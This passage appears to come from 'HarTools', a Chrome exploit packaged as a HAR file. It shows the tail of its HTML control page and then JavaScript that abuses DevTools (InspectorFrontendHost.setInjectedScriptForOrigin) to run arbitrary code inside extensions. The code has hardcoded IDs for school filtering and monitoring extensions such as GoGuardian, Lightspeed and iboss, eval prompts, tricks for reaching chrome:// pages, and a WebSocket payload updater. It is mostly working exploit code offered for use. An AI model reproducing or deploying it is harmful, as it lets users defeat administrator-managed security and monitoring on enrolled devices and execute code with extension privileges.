        right: 0;
        bottom: 0;
        background-image: radial-gradient(#303134 1px, transparent 1px);
        background-size: 2rem 2rem;
        z-index: -1;
        animation: moveGrid 4s linear infinite;
      }

      @keyframes moveGrid {
        0% {
          background-position: 0 0;
        }
        100% {
          background-position: 2rem 2rem;
        }
      }

      .background-grid:hover {
        background-position-x: 2rem;
      }
        iframe {
            width: 0;
            height: 0;
            border: 0;
            visibility: hidden;
            position: absolute;
            left: -9999px;
        }
    </style>
  </head>
  <body>
    <div class="background-grid"></div>
    <div class="main">
      <div class="header">
        <img src="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
        <h1>HarTools</h1>
        <p>Developer Tools and Extension Code execution</p>
      </div>

      <p>This was found by <a href="https://crossjbly.pages.dev/">crossjbly</a><br>
      Original RigTools Exploit was found by <a href="https://github.com/FWSmasher">FWSmasher</a></p>
      <hr>
      <p>AKA: if someone tells you that they made this, they're lying and you should laugh at them</p>
      <hr>
      <p>Additional credits: Discord: @axqmx (testing and helping with development) @pwen (ideas) | Github:
        <a href="https://github.com/FWSmasher">FWSmasher</a>,
        <a href="https://github.com/Blobby-Boi">Blobby Boi</a>
      </p>
      <hr>

      <p>Press Q for evaluating code under <a class="button" id="extdbg" href="javascript:void(0)">extension id</a></p>
      <p>Or press 1-9 for some hardcoded extensions</p>
      <p>
        <a class="button hardcoded" ext="adkcpkpghahmbopkjchobieckeoaoeem" href="javascript:void(0)">ls filter</a>
        <a class="button hardcoded" ext="hpkdokakjglppeekfeekmebfahadnflp" href="javascript:void(0)">ls alert</a>
        <a class="button hardcoded" ext="haldlgldplgnggkjaafhelgiaglafanh" href="javascript:void(0)">goguardian</a>
        <a class="button hardcoded" ext="moehkbbcbklmkcjibcbbooebgpogejoc" href="javascript:void(0)">aristotle</a>
        <a class="button hardcoded" ext="kmffehbidlalibfeklaefnckpidbodff" href="javascript:void(0)">iboss</a>
        <a class="button hardcoded" ext="mloajfnmjckfjbeeofcdaecbelnblden" href="javascript:void(0)">snap&read</a>
        <a class="button hardcoded" ext="fogjeanjfbiombghnmkmmophfeccjdki" href="javascript:void(0)">lockdown browser</a>
        <a class="button hardcoded" ext="kmpjlilnemjciohjckjadmgmicoldglf" href="javascript:void(0)">dyknow cloud</a>
        <a class="button hardcoded" ext="gndmhdcefbhlchkhipcnnbkcmicncehk" href="javascript:void(0)">gforms locked mode (enrolled cbs)</a>
        <a class="button hardcoded" ext="inoeonmfapjbbkmdafoankkfajkcphgd" href="javascript:void(0)">read and write</a>
      </p>

      <p>Press M for evaluating under <a class="button" id="devdbg" href="javascript:void(0)">devtools</a> context</p>
      <p>Typing cancel in any prompt will cancel the current operation.</p>

      <a class="button" href="devtools://devtools/bundled/inspector.html?experiments=true">Re-open devtools</a>
      <a class="button" href="javascript:void(0)" id="updater">Update payload</a>
      <a class="button" href="javascript:void(0)" id="cleanup">Cleanup and reset for extension</a>
      <a class="button" href="javascript:void(0)" id="activate">Chrome URLs</a>
      <a class="button" href="javascript:void(0)" id="activate2">Chrome URLs 2</a>
      <a class="button" href="javascript:void(0)" id="troll">Inject Tr3nch into extension</a>
    </div>

    <script defer>
      document.addEventListener("keydown", function(event) {
        if (event.key === "q") {
          document.getElementById("extdbg").click();
        } else if (event.key === "m") {
          document.getElementById("devdbg").click();
        } else if (["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(event.key)) {
          document.querySelectorAll(`.hardcoded`)[parseInt(event.key) - 1]?.click();
        }
      });
    </script>
  </body>
</html>
=`));\n            document.querySelector('#activate').onclick = function () {\n                dbgext(false, pdfId);\n            }\n            onunload = function () {\n                while (true);\n            }\n            document.close();\n            document.title = \"Dashboard\";\n            document.querySelector('#activate2').onclick = function (ev) {\n\n                function xd(w) {\n                    w.close();\n                    const pdfId = \"mhjfbmdgcfjbbpaeojofohoefgiehjai\"; // Redefinition because we convert this function to a string\n                    const mojoURL = \"chrome://resources/mojo/mojo/public/js/bindings.js\";\n                    chrome.tabs.getCurrent(function (tab) {\n                        console.log(tab);\n                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {\n                            async function createAndWriteFile() {\n                                function writeFile(filename, content) {\n                                    return new Promise((resolve) => {\n                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {\n                                            fs.root.getFile(filename, { create: true }, function (entry) {\n                                                entry.remove(function () {\n                                                    fs.root.getFile(filename, { create: true }, function (entry) {\n                                                        entry.createWriter(function (writer) {\n                                                            writer.write(new Blob([content]))\n                                                            writer.onwriteend = function () {\n                                                                resolve(entry.toURL());\n                                                            }\n                                                        })\n                                                    })\n                                                })\n                                            })\n                                        })\n                                    })\n\n                                }\n                                const htmlFile = `<html>\n                                <head></head><body><iframe src=\"filesystem:chrome://extensions/temporary/nothing.html\"></iframe>\n                                </html>\n                                <script>\n                                onerror=  alert;\n                                if (top !== window) {\n                                    top.location.replace(location.href);\n                                };\n                                </script>\n                                `\n                                \n                                // alert(url);\n                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');\n                                setTimeout(function () {\n                                    close();\n                                }, 800);\n                            }\n                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });\n                            function m2(url) {\n                                // alert(url);\n                                onmessage = function (data) {\n                                    if (data.data.type === \"ack\") {\n                                        \n                                        // chrome.tabs.getCurrent(function (tab) {\n                                            // alert(\"navigating\");\n                                            top.location.replace(\"\")\n                                        // })\n                                    }\n                                }\n                                top.postMessage({ type: 'acc' }, '*');\n                            }\n                            onmessage = function (dat) {\n                                if (dat.data.url) {\n                                    m2(dat.data.url);\n                                }\n                            };\n                        })\n                    })\n\n                }\n                dbgext(false, pdfId, xd.toString());\n            }\n            onmessage = function (ev) {\n                if (ev.data.type === \"browserInitNavigate\") {\n                    alert(1);\n                    ev.source.location.replace(ev.data.url);\n                }\n            }\n            document.querySelector('#updater').onclick = function (ev) {\n                onunload = null;\n                const ws = new WebSocket(\"ws://%%updaterurl%%\");\n\n                ws.onopen = function () {\n                    ws.onmessage = function (ev) {\n                        const received = JSON.parse(ev.data);\n                        const savedURL = received.params.request.url;\n                        ws.close();\n                        const w = open('', '_blank');\n                        console.log(savedURL);\n                        w.eval(`setTimeout(function () {opener.open(atob(\"${btoa(savedURL)}\"), '_blank'); window.close()}, 500);`);\n                        setTimeout(() => { location.reload() });\n                    }\n                    ws.send(JSON.stringify({\n                        method: \"Target.setDiscoverTargets\",\n                        id: 999,\n                        params: {}\n                    }));\n                }\n\n            }\n            onmessage = function (d) {\n                if (d.data.type === \"acc\") {\n                    onunload = function () { while (true); };\n                    d.source.postMessage({ type: \"ack\" }, '*');\n                    \n                };\n\n                if (!globalMap[d.data.uid]) return;\n\n                for (const frame of globalMap) {\n                    if (!frame) continue;\n                    if (frame.idx === d.data.uid) {\n                        frame.remove();\n                        delete globalMap[globalMap.indexOf(frame)];\n                        return;\n                    }\n                }\n            }\n            function dbgext(cleanup, id, payload) {\n                let x = id;\n                while (!x) {\n                    x = prompt('Extension id?');\n                    if (x === \"cancel\") {\n                        return;\n                    }\n                }\n                let path = '//manifest.json';\n                let is_pdf = false;\n                let injected = payload ?? payload_swamp.toString();\n                if (x === pdfId) {\n                    path = \"index.html\"; // pdf viewer hack\n                    is_pdf = true;\n                    const b = prompt(\"code to execute!\");\n                    if (!b) return;\n                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));\n                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');\n                    \n                }\n                const URL_1 = `chrome-extension://${x ??\n                    alert(\"NOTREACHED\")}/${path}`;\n                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: \"remove\", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);\n                const ifr = document.createElement(\"iframe\");\n                ifr.src = URL_1;\n                document.body.appendChild(ifr);\n                const ifrid = globalMap.push(ifr) - 1;\n                ifr.idx = ifrid;\n                ifr.onload = function () {\n\n                    ifr.contentWindow.postMessage({\n                        type: \"uidpass\", passcode:\n                            ifrid,\n                        cleanup: cleanup\n                    }, '*');\n                    // console.log('hi');\n                }\n                // alert(1);\n\n            }\n            document.querySelector('#troll').onclick = function () {\n                let removed = atob(\"// removed at the request of zeglol
console.log(1);
alert("This payload has been removed, it will not be fixed or updated again");==\");\n                eval(removed);\n            }\n            document.querySelector('#extdbg').onclick = function () {\n                dbgext(false);\n            }\n            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {\n                let extid = el.getAttribute(\"ext\");\n                console.log(el.innerText, extid);\n                dbgext(false, extid);\n                }\n            });\n            document.querySelector('#cleanup').onclick = function () {\n                dbgext(true);\n            }\n            document.querySelector('#devdbg').onclick = function () {\n                var l_canceled = false;\n                const id = setTimeout(function m() {\n                    if (l_canceled) return;\n                    (new Function(prompt(\"Evaluate script! (type 'cancel' to cancel)\")))();\n                    if (!l_canceled) setTimeout(m, 0);\n                    clearTimeout(id);\n                });\n                Object.defineProperty(window, 'cancel', {\n                    get: function () {\n                        l_canceled = true;\n                    }, configurable: true\n                })\n                return;\n            }\n            console.log(globalMap);\n        }\n        w.eval(`(${ui.toString()})()`);\n        window.close();\n\n    }\n\n    function sleep(ms) {\n        return new Promise(resolve => {\n            setTimeout(resolve, ms);\n        });\n    }\n})\n)()\n"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1
        },
        "serverIPAddress": "0.0.0.0",
        "startedDateTime": "2025-05-09T00:29:25.416Z",
        "time": 100,
        "timings": {
          "blocked": 0,
          "dns": 0,
          "ssl": 0,
          "connect": 0,
          "send": 0,
          "wait": 50,
          "receive": 50,
          "_blocked_queueing": 0
        }
      }
    ]
  }
}
